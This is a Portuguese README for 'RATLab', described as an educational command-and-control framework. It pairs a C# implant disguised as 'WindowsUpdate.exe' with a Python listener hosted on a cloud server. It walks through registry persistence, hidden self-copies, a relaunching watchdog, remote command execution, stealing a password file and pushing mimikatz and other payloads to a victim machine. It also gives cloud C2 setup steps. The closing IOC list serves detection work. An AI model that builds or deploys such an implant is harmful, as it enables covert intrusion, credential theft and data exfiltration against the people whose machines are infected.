# 🦠 RATLab — C2 Framework Educacional

> Implementação didática de um agente de acesso remoto (implant) em C# com listener em Python, para compreensão de táticas, técnicas e procedimentos (TTPs) ofensivos.

---

> ⚠️ **AVISO LEGAL:** Este repositório existe **exclusivamente para fins educacionais e de pesquisa**. O uso das técnicas e código aqui presentes contra sistemas sem autorização explícita é crime tipificado na **Lei 12.737/2012 (Lei Carolina Dieckmann)** e no **Art. 154-A do Código Penal Brasileiro**. Use somente em ambientes controlados, com permissão documentada.

---

## 📐 Arquitetura

```
┌────────────────────┐      TCP — IP Fixo Global (Oracle Cloud)     ┌─────────────────────────┐
│   IMPLANT (C#)     │ ──────────────────────────────────────────► │   VPS Oracle Cloud       │
│  WindowsUpdate.exe │ ◄────────────────────────────────────────── │   listener.py            │
│  .NET 10 / Windows │         Comandos + Respostas                 │   Ubuntu · IP Fixo · SSH │
└────────────────────┘                                              └─────────────────────────┘
                                                                              ▲
                                                                              │ SSH
                                                                    ┌─────────────────┐
                                                                    │   Operador       │
                                                                    │   Kali Linux     │
                                                                    └─────────────────┘
```

---

## 🚀 Funcionalidades

### 🤖 Implant — `RATClient.cs` (C# / .NET 10)

- **Persistência via Registro:** Insere entrada em `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` com a chave `WindowsUpdateTracker` — sobrevive a reboots sem privilégio de admin.
- **Auto-cópia para AppData:** Replica o binário como `WindowsUpdate.exe` em `%APPDATA%\WindowsUpdate\` com atributos `Hidden + System`.
- **Thread Watchdog:** Loop independente que verifica a cada 5s se o processo ainda existe — recria o arquivo e reinicia o processo automaticamente se necessário.
- **Reconexão automática:** Thread de conexão com delay configurável (`reconnectDelay`) que reconecta ao C2 caso a conexão caia.
- **Banner de sistema:** Ao conectar, envia automaticamente hostname, usuário, OS e domínio via `SYSTEM_INFO`.
- **Execução de comandos (`cmd`):** Executa comandos via `cmd.exe`, capturando stdout e stderr separadamente.
- **Navegação de diretórios (`cd`):** Altera o diretório de trabalho do processo e retorna o caminho atual.
- **Enumeração de sistema (`sysinfo`):** Retorna informações detalhadas do host — nome, usuário, domínio, OS, versão .NET, cores, uptime.
- **Exfiltração de arquivos (`download`):** Transfere arquivos arbitrários do host para o operador via protocolo customizado (`FILE_START:<nome>:<tamanho>`).
- **Recebimento de arquivos (`upload`):** Recebe arquivos enviados pelo operador e os grava em disco no diretório de trabalho atual do implant, via protocolo customizado (`FILE_PUSH:<nome>:<tamanho>`).

### 🖥️ Listener — `listener.py` (Python 3)

- Console interativo com prompt `RAT>` para envio de comandos.
- Exibe o banner `SYSTEM_INFO` automaticamente ao receber nova conexão.
- Parser de protocolo `FILE_START` para recebimento de arquivos via `download`.
- Comando `upload <caminho_local>` para envio de arquivos ao implant via protocolo `FILE_PUSH`.
- Shutdown limpo via `Ctrl+C`.
- Compilável como executável standalone via `listener.spec` (PyInstaller).

---

## ⚙️ TTPs Mapeadas (MITRE ATT&CK)

| Tática              | Técnica                                              | ID        |
|---------------------|------------------------------------------------------|-----------|
| Persistence         | Registry Run Keys / Startup Folder                   | T1547.001 |
| Defense Evasion     | Hide Artifacts: Hidden Files and Directories         | T1564.001 |
| Discovery           | System Information Discovery                         | T1082     |
| Execution           | Command and Scripting Interpreter: Windows CMD       | T1059.003 |
| Command & Control   | Application Layer Protocol: Non-Standard Port        | T1571     |
| Exfiltration        | Exfiltration Over C2 Channel                         | T1041     |
| Command & Control   | Ingress Tool Transfer                                | T1105     |

---

## 🛠️ Tecnologias

| Componente      | Stack                                                          |
|-----------------|----------------------------------------------------------------|
| Implant         | C# · .NET 10 · `System.Net.Sockets` · `Microsoft.Win32`       |
| Listener        | Python 3 · `socket` (stdlib) · PyInstaller                    |
| Protocolo       | TCP raw · framing customizado (`FILE_START` / `FILE_PUSH`)     |
| Persistência    | Windows Registry · NTFS File Attributes · Watchdog Thread      |
| Infraestrutura  | Oracle Cloud Free Tier · Ubuntu 22.04 · IP público fixo        |
| Acesso remoto   | SSH · Ed25519 · par de chaves por ambiente                     |

---

## 📁 Estrutura do Projeto

```text
RATLab/
├── RATClient.cs        # Lógica principal do agente (implant)
├── RATLab.csproj       # Projeto .NET 10 WinExe
├── app.manifest        # Manifesto de execução do assembly
├── listener.py         # Console C2 em Python
├── listener.spec       # Spec PyInstaller para compilar o listener
└── README.md
```

---

## ☁️ Infraestrutura C2 — Oracle Cloud

O listener precisa de um **IP fixo e acessível globalmente** para que o implant consiga se conectar de qualquer rede. A solução utilizada foi uma VPS na **Oracle Cloud Free Tier** (Always Free), que oferece IP público fixo sem custo.

### 1. Criar a instância na Oracle Cloud

1. Acesse [cloud.oracle.com](https://cloud.oracle.com) e crie uma conta Free Tier.
2. Vá em **Compute → Instances → Create Instance**.
3. Escolha a imagem **Ubuntu 22.04** e shape **VM.Standard.A1.Flex** (Always Free).
4. Na seção **Add SSH keys**, importe sua chave pública.
5. Anote o **IP público** — é o valor que vai em `serverIP` no `RATClient.cs`.

### 2. Gerar chave SSH (máquina do operador)

```bash
ssh-keygen -t ed25519 -C "ratlab-c2" -f ~/.ssh/ratlab_key
# ratlab_key.pub → Oracle (criação da instância)
# ratlab_key     → local, nunca sobe pro repositório
```

### 3. Conectar ao servidor C2

```bash
ssh -i ~/.ssh/ratlab_key ubuntu@<SEU_IP_ORACLE>
```

### 4. Liberar a porta no Security List da Oracle

1. Vá em **Networking → Virtual Cloud Networks → Security Lists**.
2. Adicione uma **Ingress Rule**: Protocol `TCP` · Source `0.0.0.0/0` · Porta `9001`.

E no firewall do Ubuntu:

```bash
sudo ufw allow 9001/tcp
```

### 5. Rodar o listener no servidor

```bash
scp -i ~/.ssh/ratlab_key listener.py ubuntu@<SEU_IP_ORACLE>:~/
ssh -i ~/.ssh/ratlab_key ubuntu@<SEU_IP_ORACLE>
python3 listener.py
```

---

## 🧪 Como Usar (Ambiente de Lab)

> ⚠️ Execute **somente** em máquinas virtuais isoladas ou ambiente de lab autorizado.

### 1. Configurar o Listener

```bash
python3 listener.py
# [*] Aguardando conexão na porta 9001...
```

Ou compile como executável standalone:

```bash
pyinstaller listener.spec
./dist/listener
```

### 2. Compilar o Implant

```bash
dotnet build RATLab.csproj -c Release
# Binário gerado em: bin/Release/net10.0-windows/WindowsUpdate.exe
```

> 💡 Antes de compilar, edite `serverIP` e `serverPort` em `RATClient.cs` para apontar ao seu lab.

### 3. Executar o Implant (VM alvo)

```
WindowsUpdate.exe
```

O listener exibirá o banner `SYSTEM_INFO` com os dados do host. A partir daí, use o prompt `RAT>`:

```
RAT> sysinfo
RAT> cmd whoami
RAT> cmd ipconfig /all
RAT> cd C:\Users\victim\Documents
RAT> cmd dir
RAT> download senhas.txt
```

### 4. Enviar arquivos para o implant (`upload`)

O comando `upload` permite transferir um arquivo da máquina do operador para o diretório de trabalho atual do implant. O listener lê o arquivo localmente, envia o cabeçalho `FILE_PUSH:<nome>:<tamanho>` seguido do conteúdo binário, e o implant grava o arquivo em disco.

```
RAT> upload /home/kali/tools/mimikatz.exe
# [*] Enviando mimikatz.exe (1.245.184 bytes)...
# [+] Upload concluído: mimikatz.exe
```

O arquivo será gravado no diretório de trabalho atual do implant. Use `cd` antes do upload para controlar o destino:

```
RAT> cd C:\Users\victim\AppData\Local\Temp
RAT> upload /home/kali/tools/payload.exe
```

> 💡 O protocolo `FILE_PUSH` espelha o `FILE_START` usado no `download` — mesmo framing, direção invertida.

---

## 🔍 IOCs para Blue Team / Detecção

Para fins de defesa e exercícios de threat hunting, os indicadores deste agente incluem:

- **Registro:** `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` → chave `WindowsUpdateTracker`
- **Filesystem:** `%APPDATA%\WindowsUpdate\WindowsUpdate.exe` com atributos `H+S`
- **Processo:** `WindowsUpdate.exe` originado de `%APPDATA%` (não de `C:\Windows\`)
- **Watchdog:** Processo relançado via `cmd.exe /c start` caso seja encerrado manualmente
- **Rede:** Conexão TCP de saída persistente em porta não-padrão com reconexão a cada 5s
- **Filesystem (upload):** Arquivos criados em diretórios de trabalho do implant originados de conexão de rede de entrada — binários em `%TEMP%` ou caminhos de usuário sem origem legítima

---

## 👨‍💻 Autor

**Allan Crisanto**
Técnico de TI · Graduado em ADS (Uninter) · Pós-graduando em Cibersegurança Ofensiva — Red Team Operations (FIAP/PosTech)
